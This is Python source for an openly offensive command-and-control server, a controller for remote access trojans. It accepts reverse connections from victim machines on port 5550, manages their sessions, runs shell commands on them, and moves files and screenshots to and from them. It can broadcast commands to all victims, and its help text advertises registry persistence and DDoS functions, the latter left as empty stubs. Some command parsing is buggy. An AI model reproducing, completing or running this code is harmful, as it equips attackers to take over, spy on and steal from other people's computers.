import socket
import termcolor
import json
import os
import sys
from colored import fg, attr
import time
import threading
import pyfiglet


targets = []
ips = []

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        command = input('{}${}'.format(fg(10), attr(1)))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command == 'dai':
            shell()
        elif command[:8] == 'curl':
            pass
        elif command == 'info':
            print("sending to the discord server...")
            time.sleep(3)
            print("like mac address, machine IP, machine name:....")                     
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print('''\n
            curl                                --> to download a file to the internet use -o[output] ex: -o hack.html
            everything                          --> to send a command to the pipe 
            background                          --> to change a background only for windows
            info                                --> basic info about the target
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd file name                        --> Changes Directory On Target System
            upload file name                    --> Upload File To The target Machine
            download file name                  --> Download File From Target Machine
            persistence *RegName* *fileName*    --> Create Persistence In Registry''')
        else:
            result = reliable_recv(target)
            print(result)

def accept_connections():
    while True:
        if stoper:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
        except:
            pass


stoper = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', 5550))
sock.listen(5)
sys.setrecursionlimit(1000)
t1 = threading.Thread(target=accept_connections)
t1.start()
print('\n')
print("               WELCOME TO THE ....           ")
result = pyfiglet.figlet_format("C2C SERVER")
print(result)
print('created by == {}sabarish_h4ck3r.... [H4CK3R]{}'.format(fg(10), attr(2)))
print('\n')
print(termcolor.colored('[+] Waiting For The Incoming Connections ...', 'red'))


def shell():
    while True:
        command = input('[*]C2C$:')
        if command == 'target':
            count = 0
            for ip in ips:
                print('session ' + str(count) + ' --- ' + str(ip))
                count += 1
        elif command == 'clear':
            os.system('clear')
        elif command[:7] == 'session':
            try:
                num = int(command[8:])
                vic_con = targets[num]
                vic_ip = ips[num]
                target_communication(vic_con, vic_ip)
            except:
                print('[-] there is no session')
        elif command == 'exit':
            for target in targets:
                reliable_send(target, 'quit')
                target.close()
            sock.close()
            stoper = True
            t1.join()
            break
        elif command[:4] == 'kill':
            targ = targets[int(command[5:])]
            ip = ips[int(command[5:])]
            reliable_send(targ, 'quit')
            targ.close()
            targets.remove(targ)
            ips.remove(ip)
        elif command[:7] == 'sendall':
            x = len(targets)
            print(x)
            i = 0
            try:
                while i < x:
                    tarnumber = targets[i]
                    print("sending ....")
                    reliable_send(tarnumber, command)
                    i += 1
            except:
                print('Failed')
        elif command[:7] == 'ddosstart':
            pass
        elif command[:7] == 'ddosstop':
            pass
        elif command == 'help':
                print('''\n
                target           --->     To list a the all sessions 
                session          --->     To select a targets like[session 0]
                exit             --->     To exiting the C2C server.
                quit             --->     To quiting a sessions 
                off             --->     To kill the process of a session
                sendeve          --->     To send all command for every Target
            ---------------------------------------------------------------------
                                The tools design for the DDos attack
            ---------------------------------------------------------------------
                ddosstart        --->     To Trigger the DDos funcation
                ddosdtop         --->     To stoping a DDos ''')        
        else:
            print('[*] connected... try to hackk :)')

shell()